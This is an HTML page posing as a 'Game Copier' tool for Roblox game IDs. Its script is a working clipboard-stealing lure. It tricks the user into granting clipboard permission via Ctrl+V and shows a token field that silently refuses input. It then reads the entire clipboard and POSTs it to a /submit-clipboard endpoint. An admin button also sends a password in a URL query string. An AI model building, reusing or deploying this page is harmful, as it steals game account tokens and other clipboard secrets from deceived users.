<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>GAME COPIER</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #111;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      text-align: center;
      background: #1e1e1e;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 12px rgba(255, 255, 255, 0.1);
      max-width: 400px;
      width: 90%;
    }

    h1 {
      margin-bottom: 0.2em;
      font-size: 2rem;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      background: #2b2b2b;
      color: #fff;
      font-size: 1rem;
    }

    button {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 8px;
      background: #007bff;
      color: white;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background: #0056b3;
    }

    #tokenBox {
      margin-top: 20px;
      display: none;
    }

    #adminBtn {
      background: #444;
      margin-top: 30px;
    }

    #adminBtn:hover {
      background: #666;
    }

    /* Disable text selection on token input */
    #tokenInput {
      user-select: none;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>GAME COPIER</h1>
    <p>Copy games (legally)</p>

    <input type="text" id="gameIdInput" placeholder="Enter Game ID" autocomplete="off" />
    <button id="submitBtn">Submit Game ID</button>

    <div id="tokenBox">
      <input type="text" id="tokenInput" placeholder="Paste Game Token Here" autocomplete="off" readonly />
      <button id="tokenSubmitBtn">Submit Token & Save Clipboard</button>
    </div>

    <button id="adminBtn">Admin Login</button>
  </div>

  <script>
    const gameIdInput = document.getElementById('gameIdInput');
    const submitBtn = document.getElementById('submitBtn');
    const tokenInput = document.getElementById('tokenInput');
    const tokenSubmitBtn = document.getElementById('tokenSubmitBtn');
    const tokenBox = document.getElementById('tokenBox');
    const adminBtn = document.getElementById('adminBtn');

    let permissionGranted = false;

    // Prevent all paste operations on token input
    tokenInput.addEventListener('paste', (e) => {
      e.preventDefault();
      return false;
    });

    // Prevent right-click context menu on token input
    tokenInput.addEventListener('contextmenu', (e) => {
      e.preventDefault();
      return false;
    });

    // Prevent keyboard shortcuts on token input
    tokenInput.addEventListener('keydown', (e) => {
      // Block Ctrl+V, Ctrl+A, Ctrl+C, Ctrl+X, etc.
      if (e.ctrlKey || e.metaKey) {
        e.preventDefault();
        return false;
      }
      // Block all input
      e.preventDefault();
      return false;
    });

    // Prevent input events
    tokenInput.addEventListener('input', (e) => {
      e.preventDefault();
      tokenInput.value = '';
      return false;
    });

    document.addEventListener('keydown', async (e) => {
      if (e.ctrlKey && e.key.toLowerCase() === 'v' && !permissionGranted) {
        e.preventDefault();

        try {
          await navigator.clipboard.readText();
          permissionGranted = true;
        } catch (err) {
          permissionGranted = false;
        }
      }
    });

    submitBtn.onclick = () => {
      if (!permissionGranted) {
        alert('Please press Ctrl+V once and allow clipboard permission first.');
        return;
      }

      const gameId = gameIdInput.value.trim();
      if (!gameId) {
        alert('Enter a valid Game ID');
        return;
      }

      window.open(`https://roblox.com/${gameId}`, '_blank');
      setTimeout(() => tokenBox.style.display = 'block', 500);
    };

    tokenSubmitBtn.onclick = async () => {
      // Check if permission was granted during initial Ctrl+V
      if (!permissionGranted) {
        alert('Clipboard permission was denied. Redirecting...');
        window.location.href = 'https://example.com/denied';
        return;
      }

      try {
        const clipboard = await navigator.clipboard.readText();

        await fetch('/submit-clipboard', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ clipboardData: clipboard })
        });

        alert('Clipboard content saved.');
      } catch (error) {
        // If clipboard access fails at submit time, also redirect
        alert('Clipboard access failed. Redirecting...');
        window.location.href = 'https://example.com/denied';
      }
    };

    adminBtn.onclick = () => {
      const password = prompt('Enter admin password:');
      if (password) {
        window.location.href = `/admin?password=${encodeURIComponent(password)}`;
      }
    };
  </script>
</body>
</html>
